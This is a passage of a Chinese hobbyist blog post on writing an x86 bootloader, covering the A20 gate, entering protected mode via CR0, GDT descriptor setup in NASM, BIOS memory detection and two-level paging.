title="A20GATE"></a>A20GATE</h3><p>到了80286这个拥有24位地址总线的CPU，但是<code>intel</code>为了兼容考虑，在实模式下，仍然只开启A0-A19这低20位地址线，并采用8086地址回绕。</p><p>所以我们需要突破A20地址线，这就是说的打开<strong>A20GATE</strong></p><p>其实打开A20很简单，只要把0x92端口的第1位（最低位是第0位）置1，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">in al, 0x92<br>or al, 0000_0010b<br>out 0x92, al<br></code></pre></td></tr></table></figure><h2 id="CR0寄存器的PE位"><a href="#CR0寄存器的PE位" class="headerlink" title="CR0寄存器的PE位"></a>CR0寄存器的PE位</h2><p>先了解一下CR0-CR3寄存器</p><h3 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h3><p>控制寄存器用于控制和确定处理器的操作模式以及当前执行任务的特性，在80386中有4个，分别为CR0、CR1、CR2、CR3，其中CR1被保留，为后续开发做准备。</p><p>CR0包括指示处理器工作方式的控制位，包含启用和禁止分页管理机制的控制位，包含控制浮点协处理器操作的控制位。CR2及CR3由分页管理机制使用。CR0中的位5—位30及CR3中的位0至位11是保留位，这些位不能是随意值，必须为0。</p><p>详细介绍一下CR0寄存器</p><h3 id="CR0"><a href="#CR0" class="headerlink" title="CR0"></a>CR0</h3><p>下两图出自《操作系统真象还原》</p><p><img src="/img/OS/13.png" alt="img"></p><p><img src="/img/OS/14.png" alt="img"></p><p>第0位：PE，即<code>Protection Enable</code>，为0时是实模式，为1时是保护模式，所以PE便是我们的目标，将他置1也很简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,cr0<br>or eax,0x00000001<br>mov cr0,eax<br></code></pre></td></tr></table></figure><p>顺带提一嘴，只有CR0的最高位PG为1，开启分页时，CR3才会被启用</p><h2 id="about-CPU"><a href="#about-CPU" class="headerlink" title="about CPU"></a>about CPU</h2><h3 id="流水线"><a href="#流水线" class="headerlink" title="流水线"></a>流水线</h3><p>虽然执行单元EU是CPU执行指令的唯一部件，但是CPU 的指令执行过程分为取指令、译码、执行三个步骤。每个步骤都是独立执行的， CPU 可以一边执行指令，一边取指令，一边译码。CPU是只能一次处理一个指令，但是也妹说不能干的别的事啊😋。这样就使效率得到极大的提升。</p><h4 id="jmp清空"><a href="#jmp清空" class="headerlink" title="jmp清空"></a>jmp清空</h4><p>CPU 是按照程序中指令顺序来填充流水线的，大多是情况下当前指令和下一条指令在空间上是挨着的。但如果当前执行的指令是jmp ，下一条指令已经被送上流水线译码了，第三条指令已经被送上流水线取指。but因为<code>cs:ip</code>已经跳到不知道哪去了，所以 CPU 在遇到无条件转移指令 jmp 时，会清空流水线。</p><h3 id="分支预测"><a href="#分支预测" class="headerlink" title="分支预测"></a>分支预测</h3><p>随着流水线而来的一个问题便是，如果CPU遇到一个条件跳转语句，假设两条路分别时A、B，那么CPU在还未执行判断语句的时候，是如何选择A或B进入流水线的？</p><p>最简单的方法是 2 位预测法。用 2 位 bit 的计数器来记录跳转状态，每跳转一次加 1，如果未跳转就减 1。当遇到跳转指令时，如果计数器的值大于 1 则跳转，如果小于等于 1 则不跳。这基于的原理是当一件事情发生时，有很大概率下一次还会发生。</p><p>同时，intel架构的CPU中存在分支目标缓冲器（<code>Branch Target Buffer</code>,BTB），会将分支指令的地址和跳转信息存放在其中，CPU在下一次遇到分支指令时，会在BTB寻找相同地址的指令，参照其中的统计信息，选择将哪一个分支载入流水线。如果未找到相同地址，会使用<code>Static Predictor</code>，即静态预测，这是基于大量代码的共同特征总结的。比如循环结构体一般都在结束跳转指令的上方。</p><p>当然加载错误的分支指令也没关系，只要在CPU执行前制止就行了，虽然清空流水线装载正确分支的花销挺大的😓</p><h3 id="乱序执行"><a href="#乱序执行" class="headerlink" title="乱序执行"></a>乱序执行</h3><p>就是 CPU 中运行的指令并不按照代码中的顺序执行，而是按照一定的策略打乱顺序执行，也许后面的指令先执行，当然，得保证指令之间不具备相关性 。</p><p>比如下面的例子，第一个指令需要去内存中寻找值，而add ebx只需要简单的加法操作就行了，所以CPU就会在指令1访问内存的等待中执行指令2.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax, [0xfff00]<br>add ebx, 1<br></code></pre></td></tr></table></figure><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p> 缓存是 20 世纪最大的发明，其原理是用一些存取速度较快的存储设备作为数据缓冲区，避免频繁访问速度较慢的低速存储设备，归根结底的原因是低速存储设备是整个系统的瓶颈，缓存用来缓解“瓶颈设备”的压力（摘自《操作系统真象还原》）。都知道木桶原理，和硬盘相比，内存<code>DRAM</code>的速度已经够快了，却还是连<code>CPU</code>的尾气都吃不到。所以，内存8行，就出现了三级缓存L1、L2、L3（<code>SRAM</code>，静态随机访问储存器，期待能在amd的三缓里在装系统的那天😚）。寄存器和<code>SRAM</code>在速度上是同一级别的东西，都是用相同的存储电路实现的，用的都是触发器，速度快的飞起 。</p><p> 比如当循环执行一段code时，短时间内这块内存将被高频率访问，如果将这块code放到三缓里，就能极大的提高程序运行效率。</p><h2 id="PE模式下的内存保护措施"><a href="#PE模式下的内存保护措施" class="headerlink" title="PE模式下的内存保护措施"></a>PE模式下的内存保护措施</h2><p><del>都叫保护模式了保护措施能少🐎</del></p><p><strong>段描述符&amp;选择子</strong></p><p>对使用<code>selector</code>的检查：<code>check</code>索引值，<code>check</code>是否使用了gdt中索引【0】的段描述表</p><p>针对段描述符中的<code>type</code>字段，有下列几个原则</p><ul><li>只有具备可执行属性的段才能加载到CS寄存器中</li><li>只具有可执行属性的段不允许加载到除CS外的段寄存器中</li><li>只有具备可写属性的段才能加载到SS寄存器中</li><li>至少具备可读属性的段才能加载到DS、ES、FS、GS段寄存器中</li></ul><p><code>check type</code>后，还会<code>chekc</code> P位确认内存段是否存在，访问过相应段后，会将其段描述符中的A位置1（这算什么，标记？bushi）</p><p><strong>Data &amp; System Segment</strong></p><p>段界限check</p><p>段界限：<br>$$<br>（段界限+1）*粒度-1<br>$$<br>这要注意这个就差不多了</p><p>ok，前置知识基本讲完了，可以进入保护模式了！！ヾ(≧▽≦*)o</p><h2 id="Let’s-go"><a href="#Let’s-go" class="headerlink" title="Let’s go!"></a>Let’s go!</h2><h3 id="boot-inc"><a href="#boot-inc" class="headerlink" title="boot.inc"></a>boot.inc</h3><p>多了好多配置信息</p><p><code>nasm</code>还挺人性化的，可以在数字中加”_”使数位更清楚，且不影响值的表示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----loader &amp; kernel msg-----<br>LOADER_BASE_ADDR equ 0x900<br>LOADER_START_SECTOR equ 0x2<br>;-----the value of GDT-----<br>DESC_G_4K equ 1000_0000_00000000_00000000b     ;G: 4kb<br>DESC_D_32 equ  100_0000_00000000_00000000b     ;D: 32位<br>DESC_L equ   00_0000_00000000_00000000b ;L: 32位代码段<br>DESC_AVLequ    0_0000_00000000_00000000b ;无意义<br>DESC_LIMIT_CODE2 equ      1111_00000000_00000000b ;平坦模式，就是0xf<br>DESC_LIMIT_DATA2 equ DESC_LIMIT_CODE2<br>DESC_LIMIT_VIDEO2equ      0000_00000000_00000000b ;这边设置video是为了表示显存（0xb8000），所以limit设置0<br>DESC_Pequ           10000000_00000000b ;P: 存在<br>DESC_DPL_0equ            0000000_00000000b     <br>DESC_DPL_1equ          0100000_00000000b<br>DESC_DPL_2equ            1000000_00000000b<br>DESC_DPL_3equ            1100000_00000000b<br>DESC_S_CODEequ              10000_00000000b ;S: 非系统段，代码段<br>DESC_S_DATAequ DESC_S_CODE                      ;S: 非系统段，数据段<br>DESC_S_sys equ  00000_00000000b     ;S: 系统段<br>DESC_TYPE_CODEequ       1000_00000000b     ;只执行代码段<br>DESC_TYPE_DATAequ       0010_00000000b     ;只读，向下扩展的数据段<br>;-----code gdt高位4字节-----<br>DESC_CODE_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_CODE2 + DESC_P + DESC_DPL_0 + DESC_S_CODE + DESC_TYPE_CODE + 0x00<br>;-----data gdt高四位字节-----<br>DESC_DATA_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_DATA2 + DESC_P + DESC_DPL_0 + DESC_S_DATA + DESC_TYPE_DATA + 0x00<br>;-----video gdt高四位字节-----<br>DESC_VIDEO_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_VIDEO2 + DESC_P + DESC_DPL_0 + DESC_S_DATA + DESC_TYPE_DATA + 0x0b<br>;-----the value of selector-----<br>RPL0equ 00b<br>RPL1equ 01b<br>RPL2equ 10b<br>RPL3equ 11b<br>TI_GDTequ 000b<br>TI_LDTequ 100b<br></code></pre></td></tr></table></figure><h3 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h3><p>mbr和前面的还是一样的。只是load.s经过编译后得到的load.bin的size大于512，所以读取扇区的数量改变，这边直接改成4了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,LOADER_START_SECTOR<br>mov bx,LOADER_BASE_ADDR<br>mov cx,4                    ;sector count<br>call rd_disk_m_16<br></code></pre></td></tr></table></figure><p>pack的时候脚本也有变化</p><p><code>count</code>改为4</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=./loader.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=4 <span class="hljs-attribute">seek</span>=2 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><h3 id="Load-S"><a href="#Load-S" class="headerlink" title="Load.S"></a>Load.S</h3><p>load.s要改的就比较多了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs assembly">%include &quot;boot.inc&quot;<br>SECTION LOADER vstart=LOADER_BASE_ADDR<br>LOADER_STACK_TOP equ LOADER_BASE_ADDR<br><br>jmp loader_start<br><br>GDT_BASE:                   ;gdt[0]为空<br>dd 0x00000000<br>dd 0x00000000<br><br>CODE_DESC:                  ;gdt[1]<br>dd 0x0000ffff<br>dd DESC_CODE_HIGH4<br><br>DATA_STACK_DESC:            ;gdt[2] <br>dd 0x0000ffff<br>dd DESC_DATA_HIGH4<br><br>VIDEO_DESC:                 ;gdt[3]<br>dd 0x80000007           ;(0xbffff-0xb8000)/4k = 7 <br>dd DESC_VIDEO_HIGH4<br><br>GDT_SIZEequ $ - GDT_BASE    ; 0x8*4<br>GDT_LIMITequ GDT_SIZE - 1    ; 0x20 - 1 <br>times 60 dq 0<br><br>SELECTOR_CODE equ (0x0001&lt;&lt;3) + TI_GDT + RPL0<br>SELECTOR_DATAequ (0x0002&lt;&lt;3) + TI_GDT + RPL0<br>SELECTOR_VIDEO equ (0x0003&lt;&lt;3) + TI_GDT + RPL0<br><br>gdt_ptrdw GDT_LIMIT<br>dd GDT_BASE<br><br>loadermsg db &#x27;korey is ready&#x27;<br><br>loader_start:<br>mov sp, LOADER_BASE_ADDR ;print &quot;korey is ready&quot;<br>mov bp, loadermsg<br>mov cx, 14<br>mov ax, 0x1301<br>mov bx, 0x001f<br>mov dx, 0x1800<br>int 0x10<br><br>in al, 0x92              ;open A20 gate<br>or al, 0000_0010b<br>out 0x92, al<br><br>lgdt [gdt_ptr]           ;load gdt<br> <br>mov eax, cr0             ;real mode to protection mode<br>or eax, 0x00000001<br>mov cr0, eax<br><br>jmp dword SELECTOR_CODE:p_mode_start    ;刷新流水线<br><br>[bits 32]<br>p_mode_start:<br>mov ax,SELECTOR_DATA<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov esp,LOADER_STACK_TOP<br>mov ax,SELECTOR_VIDEO<br>mov gs,ax<br><br>mov byte [gs:160], &#x27;P&#x27;<br><br>jmp $<br></code></pre></td></tr></table></figure><p>可以看到<code>jmp dword SELECTOR_CODE:p_mode_start</code>这句代码感觉有点脱裤子放屁，毕竟程序流只要顺序执行也能滑到<code>p_mode_start </code>，那为什么用<code>jmp</code>呢？因为CPU采用流水线作业（上面提到过），会将几条指令放在一起重叠执行（感觉<code>mips</code>架构这个特点就很显著），所以<code>p_mode_start</code>是32位的，和16位的一起执行直接能把CPU的CPU干烧了，这是其一。其二是虽然进入了32位保护模式，ds，cs，ss这些段寄存器里还是16位的段基址。其他位默认0，导致D位&#x3D;0，也即是进入32位模式了段寄存器还是被认为是16位，那就麻烦大了。并且<code>mov cs, xxx</code>这类指令是被禁止的，只有用远调用指令<code>call</code>，远转移指令<code>jmp</code>，远返回指令<code>retf</code>可以间接改变CS的值。所以用<code>jmp</code>清空流水线并刷新CS寄存器。</p><p>展示个结果</p><p><img src="/img/OS/15.png" alt="img"></p><h1 id="0x3-PE-to-Kernel-！！"><a href="#0x3-PE-to-Kernel-！！" class="headerlink" title="0x3:PE to Kernel ！！"></a>0x3:PE to Kernel ！！</h1><h2 id="获取内存容量"><a href="#获取内存容量" class="headerlink" title="获取内存容量"></a>获取内存容量</h2><p><code>BIOS</code>的0x15中断号中，提供了3个子功能来获取内存容量</p><ul><li>EAX &#x3D; 0xE820，遍历所有内存</li><li>EAX &#x3D; 0xE801，检测低15MB和16MB-4GB的内存，最大支持4GB</li><li>AH &#x3D; 0x88，最多检测64MB，超过64MB也返回64MB</li></ul><p>这三种功能返回的信息详细程度一词5递减，但是操作复杂程度反之</p><h3 id="0xE820"><a href="#0xE820" class="headerlink" title="0xE820"></a>0xE820</h3><p>此功能每次会返回一个不同属性的内存布局信息，因此需要不停迭代来获取全部内容</p><p>因为返回的信息较为丰富，寄存器无法存放，所以需要结构体来存放返回值，此结构体为地址范围描述符（Address Range Descripter Structure, ARDS），格式如下图。此表来自《操作系统真象还原》</p><p><img src="/img/OS/17.png" alt="img"></p><p>type字段的意义如下。此表来自《操作系统真象还原》</p><p><img src="/img/OS/18.png" alt="img"></p><p>同时，0xE820在中断前，还需要几个寄存器布置参数，返回后的值也储存在几个寄存器中。此表来自《操作系统真象还原》</p><p><img src="/img/OS/19.png" alt="img"></p><p>动手写一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">；前半部分和load.S一样<br>times 60 dq 0<br><br>total_mem_bytes dd 0<br>gdt_ptr dw GDT_LIMIT<br>dd GDT_BASE<br><br>ards_buf times244 db 0<br>ards_nrdw 0<br><br>loader_start:<br>xor ebx,ebx<br>mov esi, ards_buf<br>mov es,esi<br>xor esi,esi<br>xor edi,edi<br>.e820:<br>mov eax,0xe820<br>mov ecx,20<br>mov edx,0x534d4150<br>int 0x15<br>add edi,20<br>cmp ebx, 0<br>jnz .e820<br><br>jmp $<br></code></pre></td></tr></table></figure><p>看看ARDS</p><p><img src="/img/OS/20.png" alt="img"></p><h3 id="0xE801"><a href="#0xE801" class="headerlink" title="0xE801"></a>0xE801</h3><p>只需eax寄存器&#x3D;0xe801即可执行int 0x15调用</p><p>返回时，eax &#x3D; ecx，粒度为1kB，只显示15MB及以下的内存容量；ebx &#x3D; edx，粒度为64KB，显示16MB-4GB的内存</p><p>but我们获得的内存总量总是比实际大小小1MB，这是为了兼容老ISA设备，最后输出的时候加上去就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">loader_start:<br>.e801:<br>mov ax, 0xe801<br>int 0x15<br>mov ecx, 0x00000400<br>    mul ecx<br>    add eax, 0x100000<br>    mov esi, eax<br>    xor eax, eax<br>    mov eax, ebx<br>    mov ecx, 0x10000<br>    mul ecx<br>    add esi, eax<br><br>mov [total_mem_bytes],esi<br><br>jmp $<br></code></pre></td></tr></table></figure><p><img src="/img/OS/16.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#megs: 256<br>#megs: 128<br>megs: 64<br>#megs: 64<br>#megs: 16<br>#megs: 8<br></code></pre></td></tr></table></figure><p>和配置文件相符</p><h3 id="0x88"><a href="#0x88" class="headerlink" title="0x88"></a>0x88</h3><p>只需ah &#x3D; 0x88，返回值也只有一个，存储在eax中，最后再加上一个1MB就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">loader_start:<br>.88:<br>mov ah, 0x88<br>int 0x15<br>mov ecx,0x400<br>mul ecx<br>add eax,0x100000<br><br>mov [total_mem_bytes],eax<br><br>jmp $<br></code></pre></td></tr></table></figure><h2 id="内存分页"><a href="#内存分页" class="headerlink" title="内存分页"></a>内存分页</h2><p>内存分页解除了线性内存与物理内存一一对应的关系，通过映射关系，将线性地址映射到任意物理地址</p><p>内存分页由CPU提供硬件（页部件）支持，通过建立页表，以及页表查询来实现映射关系，这也是由CPU完成的，毕竟在CPU看来，一切都是慢速设备，不如自己来。当然还得感谢CPU设计师与OS设计师的合作。</p><p>至于什么是映射关系，这个应该不用笔者赘述了</p><h3 id="一级页表"><a href="#一级页表" class="headerlink" title="一级页表"></a>一级页表</h3><p>32位架构的CPU的地址总线的max是4GB</p><p>CPU以4kB为粒度，将内存分为一页页，此为一级页表</p><p>此时我们需要一个地方来存储每页内存的信息，这个地方就是页表（Page Table）。页表中的项称为页表项（ Page Table Entry，PTE ），其大小是 4 字节，页表项的作用是存储内存物理地址。当访问一个线性地址时，实际上就是在访问页表项中所记录的物理内存地址。</p><p>下图为一级页表示意图。来自《操作系统真象还原》</p><p><img src="/img/OS/21.png" alt="img"></p><p>页表项0-11位为页内寻址</p><p>页表项12-31位为该页表项在页表中的<code>index</code></p><p>页表的地址被存放在CR3寄存器中，可以通过CR3寄存器中页表项的物理地址（此时还未开启分页）+ index*4找到目标页表项对应的物理地址，最后加上低12位的偏移，就能访问对应的物理地址</p><p>But，想一下，4GB总内存，以4kB的粒度分，光页表项就有<code>0x100000</code>之多，存储这些页表项就要花费4MB大小的内存。并且每个进程都有独立的页表，光是这些内存就是一笔很大的开销，那怎么办捏？</p><p>一级页表不行，👴再套一层不行🐎</p><p>所以二级页表他来了</p><h3 id="二级页表"><a href="#二级页表" class="headerlink" title="二级页表"></a>二级页表</h3><p>先看一下二级页表示意图。下图来自《操作系统真象还原》</p><p><img src="/img/OS/22.png" alt="img"></p><p>这次CPU学聪明了，先创建一个4KB大小的页目录表，其中存放着1024个页目录项（Page Directory Entry， PDE）。何为页目录项？就是页表的物理地址，页目录项大小同页表项一样，都用来描述一个物理页的物理地址，其大小都是 4 字节。</p><p>页目录表中共 1024 个页表，也就是有 1024 个页目录项 。一个页目录项中记录一个页表物理页地址，物理页地址是指页的物理地址，在页目录项及页表项中记录的都是页的物理地址。</p><p>中间层果然是万能的(bushi)</p><p>二级页表虽然原理与一级页表相同，但是寻址方式发生了一点小变化</p><p>对于一个32位虚拟地址：</p><ul><li>0-11位：页内偏移</li><li>12-21位：PTE索引</li><li>22-31位：PDE索引</li></ul><p>计算公式和一级页表类似</p><p>反正这些公式的计算是<code>CPU</code>帮👴干的</p><p>突然，受尽压榨的<code>CPU</code>发现，这些页表项和页目录项都是以4KB为粒度，也就是说最后12位都是0，反正固定不变的东西，存放点信息不是美滋滋，于是，<code>PTE</code>和<code>PDE</code>就被改造调教开发成了下面的模样🥵。下图来自《操作系统真象还原》</p><p><img src="/img/OS/23.png" alt="img"></p><ul><li>P：present 1：存在内存中&#x2F;0：不存在内存中</li><li>RW：read&#x2F;wirte 1：可读可写&#x2F;0：可读不可写</li><li>US：user&#x2F;super 1：非特权&#x2F;0：特权</li><li>PWT：Page-level Write-Through，页级通写位，置1表示此内存页是高速缓存，此处置0即可</li><li>PCD：Page-level Cache Disable，页级高速缓存禁止位，置1表示此内存页启用高速缓存，此处置0即可</li><li>A：Accessed，访问位 1：被CPU访问过，用来统计访问频率</li><li>D：Dirty，脏页，CPU对一个内存页执行写操作后，会对此内存页对应的页表项D位置1</li><li>PAT：Page Attribute Table，太复杂了，👴不写了</li><li>G：Global，全局位，与下文的TLB有关</li><li>AVL：Available，可用位，但是可不可用跟CPU👴有什么关系</li></ul><h3 id="开启页表"><a href="#开启页表" class="headerlink" title="开启页表"></a>开启页表</h3><p>boot.inc添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----页表物理地址-----<br>PAGE_DIR_TABLE_POS equ 0x100000<br>;-----页表属性-----<br>PG_Pequ 1b<br>PG_RW_Requ 00b<br>PG_RW_Wequ 10b<br>PG_US_S equ 000b<br>PG_US_Uequ 100b<br></code></pre></td></tr></table></figure><p>load.S</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----前面就是进入PE模式-----<br>call setup_page<br><br>sgdt [gdt_ptr]                                          ;保存当前gdt的值<br>mov ebx, [gdt_ptr + 2]                                  ;使gdt_base和selector3的base加0xc0000000<br>or dword [ebx + 0x18 + 4], 0xc0000000<br>add dword [gdt_ptr + 2], 0xc0000000<br>add esp, 0xc0000000<br><br>mov eax, PAGE_DIR_TABLE_POS                             ;将页目录表物理地址存进CR3<br>mov cr3, eax<br><br>mov eax, cr0                                            ;开启分页<br>or eax, 0x80000000<br>mov cr0, eax<br><br>lgdt [gdt_ptr]<br>mov byte [gs:160], &#x27;V&#x27;<br><br>jmp $<br><br><br>setup_page:<br>[bits 32]<br>mov ecx,0x1000<br>mov esi,0<br>.clear_page_dir:                                    ;将页目录表清零<br>mov byte[PAGE_DIR_TABLE_POS + esi],0<br>inc esi<br>loop .clear_page_dir<br><br>.create_pde:<br>mov eax, PAGE_DIR_TABLE_POS                     ;第一个页表创建在物理地址0x101000<br>add eax, 0x1000<br>mov ebx, eax<br><br>or eax, PG_US_U | PG_RW_W | PG_P                ;用户权限、可写、存在<br>mov [PAGE_DIR_TABLE_POS + 0x0], eax             ;将index=0 &amp; 768的页目录项赋值为0x101007，c00以上的用于内核空间<br>mov [PAGE_DIR_TABLE_POS+0xc00], eax<br>sub eax, 0x1000<br>mov [PAGE_DIR_TABLE_POS+4092],eax               ;将页目录表的物理地址作为最后一个页目录项<br><br>mov ecx, 256                                    ;将0x100000以下的内存，作为第一个页表中的PTE<br>mov esi, 0<br>mov edx, PG_US_U | PG_RW_W | PG_P<br><br>.create_pte:<br>mov [ebx+esi*4], edx<br>add edx, 0x1000<br>inc esi<br>loop .create_pte<br><br>mov eax, PAGE_DIR_TABLE_POS                         ;将1MB-1GB的内存全部映射到高处，使得内核和操作系统共享同一片物理地址<br>add eax, 0x2000<br>or eax, PG_US_U | PG_RW_W | PG_P<br>mov ebx, PAGE_DIR_TABLE_POS<br>mov ecx, 254<br>mov esi, 769<br><br>.create_kernel_pde:<br>mov [ebx+esi*4], eax<br>inc esi<br>add eax, 0x1000<br>loop .create_kernel_pde<br><br>ret<br></code></pre></td></tr></table></figure><h3 id="虚拟地址访问页表"><a href="#虚拟地址访问页表" class="headerlink" title="虚拟地址访问页表"></a>虚拟地址访问页表</h3><p>用<code>info tab</code>可以查看页表映射</p><p><img src="/img/OS/24.png" alt="img"></p><p>这边解释一下为什么会有这种奇怪的映射，因为页目录表的最后一项页目录项是页表的物理地址，对应虚拟地址的高10位为0x3ff</p><p>此时页目录项为<code>0x100000</code>，最后一个页表项还是原来的页目录项，就是这玩意被用了两次，第一次当页目录项，第二次当页表项，无限套娃。其余两个也是这个思路，所以访问<code>0xfffffXXX</code>的虚拟地址，就能访问页表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xfffff000-0xffffffff -&gt; 0x000000100000-0x000000100fff<br></code></pre></td></tr></table></figure><h3 id="TLB"><a href="#TLB" class="headerlink" 